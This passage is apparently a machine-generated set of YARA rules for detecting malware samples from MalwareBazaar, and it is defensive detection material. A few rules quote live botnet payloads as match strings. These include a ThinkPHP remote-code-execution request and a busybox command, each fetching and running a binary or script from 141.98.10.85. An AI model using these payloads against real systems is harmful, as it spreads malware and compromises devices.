        description = "Auto ML: 81921ea5f890589516c8bdf261b819446bc5e59403b83c8ec802f638ffd8065c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://141.98.10.85/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 77KB and
        all of them
}

rule Windows_81cf1c51b336bc81ecd72f78b74d0d7396ed07568dddcd5768c1ad72150be89f
{
    meta:
        description = "Auto ML: 81cf1c51b336bc81ecd72f78b74d0d7396ed07568dddcd5768c1ad72150be89f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "<WriteLine>b__0_0"
        $s6 = "<GetDefaultIPv4Address>b__1_0"
        $s7 = "<GetDefaultIPv4Address>b__1_1"
        $s8 = "Microsoft.Win32"
        $s9 = "User32"
        $s10 = "<Module>"
        $s11 = "GetWindowDC"
        $s12 = "System.Drawing.Drawing2D"
        $s13 = "TPM_RETURNCMD"
        $s14 = "FILETIME"
        $s15 = "SC_CLOSE"
        $s16 = "DCX_LOCKWINDOWUPDATE"
        $s17 = "get_ASCII"
        $s18 = "get_JSON"
        $s19 = "OpenVPN"
        $s20 = "RM_PROCESS_INFO"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 220KB and
        all of them
}

rule Windows_81e0f965f92b1b5ab9e12f818e2751bde8b8119f6a83fa84035434f38920c91c
{
    meta:
        description = "Auto ML: 81e0f965f92b1b5ab9e12f818e2751bde8b8119f6a83fa84035434f38920c91c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "}GETX"
        $s4 = "https://d.symcb.com/cps0%"
        $s5 = "https://d.symcb.com/rpa0."
        $s6 = "http://s.symcd.com06"
        $s7 = "%http://s.symcb.com/universal-root.crl0"
        $s8 = "https://d.symcb.com/rpa0@"
        $s9 = "/http://ts-crl.ws.symantec.com/sha256-tss-ca.crl0"
        $s10 = "http://ts-ocsp.ws.symantec.com0;"
        $s11 = "/http://ts-aia.ws.symantec.com/sha256-tss-ca.cer0("
        $s12 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s13 = "http://pki-ocsp.symauth.com0"
        $s14 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s15 = "kernel32.dll"
        $s16 = "user32.dll"
        $s17 = "advapi32.dll"
        $s18 = "oleaut32.dll"
        $s19 = "shell32.dll"
        $s20 = "version.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1491KB and
        all of them
}

rule Windows_828cda2143a5d51706f89716c96c8714cdadac696df62a806e566ecead0ed4ce
{
    meta:
        description = "Auto ML: 828cda2143a5d51706f89716c96c8714cdadac696df62a806e566ecead0ed4ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".rsrc"
        $s6 = "@.reloc"
        $s7 = "SetThreadPreferredUILanguages"
        $s8 = "SetProcessPreferredUILanguages"
        $s9 = "GetNativeSystemInfo"
        $s10 = "Could not overwrite file \"%s\"."
        $s11 = "Could not create file \"%s\"."
        $s12 = "No \"HelpText\" in the configuration file."
        $s13 = "\"setup.exe\""
        $s14 = "Could not find \"setup.exe\"."
        $s15 = "Could not delete file or folder \"%s\"."
        $s16 = "Could not create folder \"%s\"."
        $s17 = "Could not write SFX configuration."
        $s18 = "Could not read SFX configuration or configuration not found."
        $s19 = "Could not open archive file \"%s\"."
        $s20 = "Could not get SFX filename."
    condition:
        uint32(0) == 0x00605a4d and
        filesize < 1035KB and
        all of them
}

rule Windows_82938e004b66e08eaa68cefb98eb52dae747e96763dce49b67041f25005dfd3f
{
    meta:
        description = "Auto ML: 82938e004b66e08eaa68cefb98eb52dae747e96763dce49b67041f25005dfd3f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System.ComponentModel"
        $s7 = "System.CodeDom.Compiler"
        $s8 = "System.Diagnostics"
        $s9 = "DebuggerNonUserCodeAttribute"
        $s10 = "System"
        $s11 = "Microsoft.VisualBasic.CompilerServices"
        $s12 = "StandardModuleAttribute"
        $s13 = "HideModuleNameAttribute"
        $s14 = "GetObjectValue"
        $s15 = "GetHashCode"
        $s16 = "GetTypeFromHandle"
        $s17 = "CreateInstance"
        $s18 = "System.Runtime.InteropServices"
        $s19 = "ThreadStaticAttribute"
        $s20 = "m_ThreadStaticValue"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 37KB and
        all of them
}

rule Windows_82a4f34acb3cdd88fe0f4effeda5358cdcfe34373d1162771ceb19aa16cc2f0d
{
    meta:
        description = "Auto ML: 82a4f34acb3cdd88fe0f4effeda5358cdcfe34373d1162771ceb19aa16cc2f0d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = ".data"
        $s4 = ".rsrc"
        $s5 = "DeleteFileW"
        $s6 = "FindFirstFileW"
        $s7 = "FindNextFileW"
        $s8 = "FindClose"
        $s9 = "SetFilePointer"
        $s10 = "ReadFile"
        $s11 = "WriteFile"
        $s12 = "GetPrivateProfileStringW"
        $s13 = "WritePrivateProfileStringW"
        $s14 = "LoadLibraryExW"
        $s15 = "GetModuleHandleW"
        $s16 = "GetExitCodeProcess"
        $s17 = "CloseHandle"
        $s18 = "SetFileTime"
        $s19 = "CompareFileTime"
        $s20 = "GetShortPathNameW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 48KB and
        all of them
}

rule Windows_82bfcca0c937434192318662d7f4888d008eda18c0b37635aea0b5b811cbb17b
{
    meta:
        description = "Auto ML: 82bfcca0c937434192318662d7f4888d008eda18c0b37635aea0b5b811cbb17b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win64"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.reloc"
        $s6 = "@.rsrc"
        $s7 = "System"
        $s8 = "Create"
        $s9 = "IOffset"
        $s10 = "ImplGetter"
        $s11 = "GetInterface"
        $s12 = "GetInterfaceEntry"
        $s13 = "GetInterfaceTable"
        $s14 = "GetHashCode"
        $s15 = "NewInstance"
        $s16 = "TMonitor.PWaitingThread"
        $s17 = "TMonitor.TWaitingThread"
        $s18 = "Thread"
        $s19 = "FOwningThread"
        $s20 = "SetSpinCount"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 25077KB and
        all of them
}

rule Windows_8302d62f0ccd3c416440e413b641e698172e5258c81f1271da5fa782c034cc15
{
    meta:
        description = "Auto ML: 8302d62f0ccd3c416440e413b641e698172e5258c81f1271da5fa782c034cc15"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "ADVAPI32.dll"
        $s6 = "ntdll.DLL"
        $s7 = "KERNEL32.dll"
        $s8 = "USER32.dll"
        $s9 = "msvcrt.dll"
        $s10 = "gdiplus.dll"
        $s11 = "COMCTL32.dll"
        $s12 = "SHLWAPI.dll"
        $s13 = "SHELL32.dll"
        $s14 = "OLEAUT32.dll"
        $s15 = "UxTheme.dll"
        $s16 = "OLEACC.dll"
        $s17 = "msdrm.dll"
        $s18 = "Delete"
        $s19 = "CCaptureForm::SetVisible"
        $s20 = "CCaptureForm::SetCapture"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 420KB and
        all of them
}

rule Linux_832aaeebe836290917751917d95614dee04051b970be82fd498fc5f403bf3998
{
    meta:
        description = "Auto ML: 832aaeebe836290917751917d95614dee04051b970be82fd498fc5f403bf3998"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "wget-log"
        $s5 = "1337SoraLOADER"
        $s6 = "nloads"
        $s7 = "gang123isgodloluaintgettingthesebinslikedammwtf."
        $s8 = "elfLoad"
        $s9 = "processor"
        $s10 = "/sys/devices/system/cpu"
        $s11 = "_Unwind_VRS_Get"
        $s12 = "_Unwind_VRS_Set"
        $s13 = "_Unwind_GetCFA"
        $s14 = "_Unwind_Complete"
        $s15 = "_Unwind_DeleteException"
        $s16 = "_Unwind_GetTextRelBase"
        $s17 = "_Unwind_GetDataRelBase"
        $s18 = "__gnu_Unwind_ForcedUnwind"
        $s19 = "__gnu_Unwind_Resume"
        $s20 = "__gnu_Unwind_RaiseException"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 129KB and
        all of them
}

rule Windows_8346fd8577212a80d6899c2c718aeea5eda3b385da5143185aea6e8a41a36d64
{
    meta:
        description = "Auto ML: 8346fd8577212a80d6899c2c718aeea5eda3b385da5143185aea6e8a41a36d64"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "map/set too long"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3140KB and
        all of them
}

rule Linux_0bc9c084c262a26e686902d19a051678b0c7811477fd01de00b1009892fa4d3c
{
    meta:
        description = "Auto ML: 0bc9c084c262a26e686902d19a051678b0c7811477fd01de00b1009892fa4d3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "j\"AZj"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 1KB and
        all of them
}

rule Linux_835099877fff293e7d5f227ee8af9792f018f240f3f4b9a4087dff8a76fd3ac4
{
    meta:
        description = "Auto ML: 835099877fff293e7d5f227ee8af9792f018f240f3f4b9a4087dff8a76fd3ac4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "(POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s5 = "Connection: keep-alive"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 82KB and
        all of them
}

rule Windows_836702e8e9b5cc72d071836f7aece14f2f55103db492110feb3d1df399cb5a7e
{
    meta:
        description = "Auto ML: 836702e8e9b5cc72d071836f7aece14f2f55103db492110feb3d1df399cb5a7e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4011KB and
        all of them
}

rule Windows_83716867ce29635da108fe727d026684d2d853b700edead2e201a38583995e40
{
    meta:
        description = "Auto ML: 83716867ce29635da108fe727d026684d2d853b700edead2e201a38583995e40"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Diagram.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "ConnectionProvider"
        $s8 = "ConfigReader"
        $s9 = "FileScanning"
        $s10 = "FileSearcher"
        $s11 = "OpenVPN"
        $s12 = "System.Windows.Forms"
        $s13 = "QueryProcessor"
        $s14 = "QueryCmd"
        $s15 = "DownloadAndExecuteUpdate"
        $s16 = "DownloadUpdate"
        $s17 = "OpenUpdate"
        $s18 = "FileExt"
        $s19 = "UserExt"
        $s20 = "FileUtil"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB and
        all of them
}

rule Linux_838cd9004a5e849f238675106bcafc75be9207573f2d79a38d778599d3baac8a
{
    meta:
        description = "Auto ML: 838cd9004a5e849f238675106bcafc75be9207573f2d79a38d778599d3baac8a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/tmp/tempXXXXXX"
        $s2 = "/proc/self/cmdline"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 60KB and
        all of them
}

rule Linux_83d1cb2bacc1020ee409d91d466b6070ecbaf76fb940efc6f9d53ac44df6bda9
{
    meta:
        description = "Auto ML: 83d1cb2bacc1020ee409d91d466b6070ecbaf76fb940efc6f9d53ac44df6bda9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 161KB and
        all of them
}

rule Linux_83ebda36fd35669fb0644dc692e6354f2544936d34d382668e6f84ba5c84d1c6
{
    meta:
        description = "Auto ML: 83ebda36fd35669fb0644dc692e6354f2544936d34d382668e6f84ba5c84d1c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB and
        all of them
}

rule Windows_83f87484754b4f4301e2b9cf06e5400d232e14129f86384ad192e42eb4b0d2af
{
    meta:
        description = "Auto ML: 83f87484754b4f4301e2b9cf06e5400d232e14129f86384ad192e42eb4b0d2af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2678KB and
        all of them
}

rule Linux_84396bb4667f76355bb417156a49002d35a78c4a3c415b878d3ba852ffac6eaf
{
    meta:
        description = "Auto ML: 84396bb4667f76355bb417156a49002d35a78c4a3c415b878d3ba852ffac6eaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "connect"
        $s2 = "sigemptyset"
        $s3 = "getpid"
        $s4 = "readlink"
        $s5 = "socket"
        $s6 = "readdir"
        $s7 = "sigaddset"
        $s8 = "setsockopt"
        $s9 = "read"
        $s10 = "memset"
        $s11 = "getppid"
        $s12 = "opendir"
        $s13 = "getsockopt"
        $s14 = "open"
        $s15 = "closedir"
        $s16 = "close"
        $s17 = "getsockname"
        $s18 = "/system"
        $s19 = "/ (deleted)"
        $s20 = "M-SEARCH * HTTP/1.1"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 42KB and
        all of them
}

rule Windows_84713aa9c504e1e41b1fb05b4443d88045964ef157b3b7982c8606b848fcfb11
{
    meta:
        description = "Auto ML: 84713aa9c504e1e41b1fb05b4443d88045964ef157b3b7982c8606b848fcfb11"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "SystemFuH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = "kernel32H9"
        $s17 = ".dllu"
        $s18 = ">.exeu"
        $s19 = "thread"
        $s20 = "Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2307KB and
        all of them
}

rule Windows_84b0e2a4b475fe6eaa507eae7667016a7d3c684d8ba55fcdbcdf00e76fa12fe4
{
    meta:
        description = "Auto ML: 84b0e2a4b475fe6eaa507eae7667016a7d3c684d8ba55fcdbcdf00e76fa12fe4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s7 = "GetTempPath2W"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "no such process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1671KB and
        all of them
}

rule Windows_0bfbf2c85ce9fcf06ffcd1fa04bcb0d74da169fb0c6567c532a7ef09f1850d9f
{
    meta:
        description = "Auto ML: 0bfbf2c85ce9fcf06ffcd1fa04bcb0d74da169fb0c6567c532a7ef09f1850d9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Cannot read Table of Contents."
        $s7 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s9 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s10 = "Failed to extract %s: failed to read data chunk!"
        $s11 = "fread"
        $s12 = "Failed to extract %s: failed to write data chunk!"
        $s13 = "fwrite"
        $s14 = "Failed to extract %s: failed to open archive file!"
        $s15 = "Failed to extract %s: failed to open target file!"
        $s16 = "fopen"
        $s17 = "Failed to read cookie!"
        $s18 = "Could not read full TOC!"
        $s19 = "Error on file."
        $s20 = "Failed to open archive %s!"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19272KB and
        all of them
}

rule Windows_84e6f00d114d875964b9a4d54d53ec6668e325653d3d5b9fb3d6c767040e8143
{
    meta:
        description = "Auto ML: 84e6f00d114d875964b9a4d54d53ec6668e325653d3d5b9fb3d6c767040e8143"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "Load_LuongNV"
        $s6 = "System.Data"
        $s7 = "Load_Data"
        $s8 = "GetData"
        $s9 = "Form1_Load"
        $s10 = "add_Load"
        $s11 = "MatKhau_Load"
        $s12 = "get_Checked"
        $s13 = "set_Enabled"
        $s14 = "set_FormattingEnabled"
        $s15 = "CreateInstance"
        $s16 = "set_DataSource"
        $s17 = "set_AutoScaleMode"
        $s18 = "set_ColumnHeadersHeightSizeMode"
        $s19 = "get_Message"
        $s20 = "set_Visible"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 746KB and
        all of them
}

rule Windows_84f668529edea0be84b952dd2b2daa4b4463416b0c7a721eda7a4f9f1c2f7b43
{
    meta:
        description = "Auto ML: 84f668529edea0be84b952dd2b2daa4b4463416b0c7a721eda7a4f9f1c2f7b43"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "user32"
        $s6 = "GetWindowRect"
        $s7 = "GetWindowLongA"
        $s8 = "SetWindowLongA"
        $s9 = "SetLayeredWindowAttributes"
        $s10 = "window"
        $s11 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\XMdtjt\\tp"
        $s12 = "CFile"
        $s13 = "CMemFile"
        $s14 = "CTempGdiObject"
        $s15 = "CTempDC"
        $s16 = "CWindowDC"
        $s17 = "CUserException"
        $s18 = "MS Shell Dlg"
        $s19 = "CTempWnd"
        $s20 = "GetMonitorInfoA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 710KB and
        all of them
}

rule Windows_8507630f173a2b6429290c725cc704488616c708563234f603f1b0fdf461de10
{
    meta:
        description = "Auto ML: 8507630f173a2b6429290c725cc704488616c708563234f603f1b0fdf461de10"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3541KB and
        all of them
}

rule Windows_8518533444f9d26fabdd17053c4e69df268c6f3d3ef8be30fd2ab649641b6343
{
    meta:
        description = "Auto ML: 8518533444f9d26fabdd17053c4e69df268c6f3d3ef8be30fd2ab649641b6343"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 202KB and
        all of them
}

rule Windows_851e7b8312083b0068cf53b838e1b11394b60b6d678ed6e4bd4da672becb0ee4
{
    meta:
        description = "Auto ML: 851e7b8312083b0068cf53b838e1b11394b60b6d678ed6e4bd4da672becb0ee4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Linux_8526c9ec79feb6493e41d770fa6cea984641a676f9ba121fc2b8a3428ace585c
{
    meta:
        description = "Auto ML: 8526c9ec79feb6493e41d770fa6cea984641a676f9ba121fc2b8a3428ace585c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "USER"
        $s2 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 23KB and
        all of them
}

